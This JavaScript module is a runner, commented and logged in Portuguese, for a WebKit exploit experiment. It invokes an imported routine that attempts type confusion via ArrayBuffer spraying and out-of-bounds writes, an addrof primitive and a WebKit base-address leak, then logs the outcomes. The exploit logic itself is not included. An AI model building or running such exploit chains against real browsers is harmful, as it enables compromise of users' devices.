// js/script3/runAllAdvancedTestsS3.mjs (Adaptado para Spray AB + TC Read As ABV)
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
import {
    executeTypedArrayVictimAddrofAndWebKitLeak_R43,
    FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT
} from './testArrayBufferVictimCrash.mjs';

// safeToHexRunner (como definido anteriormente, ou importado)
function safeToHexRunner(value, length = 8) { /* ... */
    if (typeof value === 'number') { return '0x' + (value >>> 0).toString(16).padStart(length, '0'); }
    if (value === null || value === undefined) { return String(value); }
    if (typeof value === 'string' && value.startsWith('0x')) { return value; }
    return String(value);
}

async function runHeisenbugReproStrategy_TypedArrayVictim_R43() {
    const FNAME_RUNNER = "runHeisenbugReproStrategy_TypedArrayVictim_R43_SprayAB";
    logS3(`==== INICIANDO Estratégia de Reprodução do Heisenbug (${FNAME_RUNNER}) ====`, 'test', FNAME_RUNNER);
    const result = await executeTypedArrayVictimAddrofAndWebKitLeak_R43();

    const module_name_for_title = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;

    if (result.errorOccurred) {
        logS3(`  RUNNER R43(SprayAB): Teste principal capturou ERRO: ${String(result.errorOccurred)}`, "critical", FNAME_RUNNER);
        document.title = `${module_name_for_title}: MainTest ERR!`;
    } else if (result) {
        let paramsUsedMsg = 'N/A';
        if (result.oob_params_used) { // Campo direto do resultado para este teste
            paramsUsedMsg = `Offset: ${result.oob_params_used.offset}, Valor: ${result.oob_params_used.value}`;
        } else if (result.oob_value_of_best_result) { // Fallback
             paramsUsedMsg = `OOB Value (fallback): ${result.oob_value_of_best_result}`;
        }

        logS3(`  RUNNER R43(SprayAB): Completou. Parâmetros OOB usados: ${paramsUsedMsg}`, "good", FNAME_RUNNER);
        logS3(`  RUNNER R43(SprayAB): Detalhes Sonda TC: ${result.tc_probe_details ? JSON.stringify(result.tc_probe_details) : 'N/A'}`, "leak_detail", FNAME_RUNNER);

        const heisenbugSuccessfullyDetected = result.heisenbug_on_M2_in_best_result;
        const sprayReadAnalysis = result.spray_read_analysis; // Novo campo

        logS3(`  RUNNER R43(SprayAB): Heisenbug TC Sonda: ${heisenbugSuccessfullyDetected ? "CONFIRMADA" : "NÃO CONFIRMADA"}`, heisenbugSuccessfullyDetected ? "vuln" : "warn", FNAME_RUNNER);

        if (sprayReadAnalysis) {
            logS3(`  RUNNER R43(SprayAB): Análise de Leitura de Spray Pós-TC:`, "info_emphasis", FNAME_RUNNER);
            logS3(`    Notas: ${sprayReadAnalysis.notes}`, sprayReadAnalysis.this_is_arraybufferview ? (sprayReadAnalysis.notes.includes("SPRAY") ? "success_major" : "vuln") : "info", FNAME_RUNNER);
            logS3(`    'this' comportou-se como ArrayBufferView: ${sprayReadAnalysis.this_is_arraybufferview}`, sprayReadAnalysis.this_is_arraybufferview ? "vuln" : "info", FNAME_RUNNER);
            if (sprayReadAnalysis.this_is_arraybufferview) {
                logS3(`    Conteúdo do buffer de 'this': ${sprayReadAnalysis.this_buffer_content}`, "leak", FNAME_RUNNER);
                logS3(`    Comprimento de 'this': ${sprayReadAnalysis.this_length}`, "leak_detail", FNAME_RUNNER);
                logS3(`    this[0] (especulativo): ${sprayReadAnalysis.this_property_0}`, "leak_detail", FNAME_RUNNER);
            }
        } else {
            logS3(`  RUNNER R43(SprayAB): Detalhes da Análise de Leitura de Spray não disponíveis.`, "warn", FNAME_RUNNER);
        }
        
        // Addrof e WebKitLeak logs
        if (result.addrof_result) { logS3(`  RUNNER R43(SprayAB): Teste Addrof: ${result.addrof_result.msg}`, "info", FNAME_RUNNER); }
        if (result.webkit_leak_result) { logS3(`  RUNNER R43(SprayAB): Teste WebKit Base Leak: ${result.webkit_leak_result.msg}`, "info", FNAME_RUNNER); }

        let finalTitleSegment = "No Notable Result";
        if (sprayReadAnalysis?.this_is_arraybufferview) {
            finalTitleSegment = "TC read 'this' as ABV!";
            if (sprayReadAnalysis.notes.includes("SPRAY")) {
                 finalTitleSegment = "TC read SPRAYED ABV!";
            }
        } else if (heisenbugSuccessfullyDetected) {
            finalTitleSegment = "TC Confirmed, No ABV Read";
        }
        document.title = `${module_name_for_title}_R43_SprayAB: ${finalTitleSegment}`;


        if (result.iteration_results_summary && result.iteration_results_summary.length > 0) {
            logS3(`  RUNNER R43(SprayAB): Sumário da Iteração (haverá apenas 1):`, "info", FNAME_RUNNER);
            const iter_sum = result.iteration_results_summary[0];
            const tcSuccess = iter_sum.heisenbug_on_M2_confirmed_by_tc_probe;
            const sprayReadSuccess = iter_sum.spray_read_analysis?.this_is_arraybufferview;
            let logMsg = `    Iter 1 (OOB ${iter_sum.oob_value}): TC=${tcSuccess}, 'this' as ABV=${sprayReadSuccess}`;
            if(iter_sum.error) logMsg += `, Err: ${iter_sum.error}`;
            logS3(logMsg, "info", FNAME_RUNNER);
        }

    } else { /* ... */ }
    // ... (resto do runner)
    logS3(`  Título da página final: ${document.title}`, "info", FNAME_RUNNER);
    await PAUSE_S3(MEDIUM_PAUSE_S3);
    logS3(`==== Estratégia de Reprodução do Heisenbug (${FNAME_RUNNER}) CONCLUÍDA ====`, 'test', FNAME_RUNNER);
}

export async function runAllAdvancedTestsS3() {
    const FNAME_ORCHESTRATOR = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT}_MainOrchestrator_SprayAB`;
    logS3(`==== INICIANDO Script 3 R43_SprayAB (${FNAME_ORCHESTRATOR}) ... ====`, 'test', FNAME_ORCHESTRATOR);
    await runHeisenbugReproStrategy_TypedArrayVictim_R43();
    logS3(`\n==== Script 3 R43_SprayAB (${FNAME_ORCHESTRATOR}) CONCLUÍDO ====`, 'test', FNAME_ORCHESTRATOR);
    const runBtn = getRunBtnAdvancedS3(); if (runBtn) runBtn.disabled = false;

    if (document.title.includes(FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT) &&
        !document.title.includes("ABV") && // Ajustar condições do título
        !document.title.includes("OK") &&
        !document.title.includes("ERR") &&
        !document.title.includes("Invalid")) {
        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT}_R43_SprayAB_Done`;
    }
}
